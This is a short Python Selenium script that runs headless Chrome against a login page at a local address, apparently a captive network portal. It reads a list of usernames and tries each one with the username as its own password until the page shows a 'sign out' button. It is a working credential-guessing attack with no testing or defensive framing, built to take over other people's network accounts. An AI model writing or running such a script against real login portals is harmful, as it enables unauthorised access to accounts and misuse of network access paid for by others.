from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
import time

with open("debug_log.txt", "a") as f:
    f.write("SCRIPT STARTED\n")

with open("user.txt" , "r") as file:
    users = [line.strip() for line in file if line.strip()]

url = "http://172.16.16.16:8090/httpclient.html"

options = Options()
options.add_argument("--headless=new")
options.add_argument("--disable-gpu")
options.add_argument("--window-size=1920,1080")

path = r"C:\Users\Rashmalai\Downloads\ABDM\Compressed\chromedriver-win64\chromedriver.exe"

service = Service(path)

driver = webdriver.Chrome(service=service,options=options)

success = False

for USER in users:

    try:
        driver.get(url)

        time.sleep(3)


        username = driver.find_element(By.ID, "username")
        username.clear()
        username.send_keys(USER)


        password = driver.find_element(By.ID, "password")
        password.clear()
        password.send_keys(USER)

        login = driver.find_element(By.ID,"loginbutton")
        login.click()

        time.sleep(5)


        button = driver.find_element(By.ID,"loginbutton")

        if "sign out" in button.text.lower():
            success = True
            break
    except Exception as e:
        print(f"ERROR with {USER}: {e}")

if not success:
    print("No account found")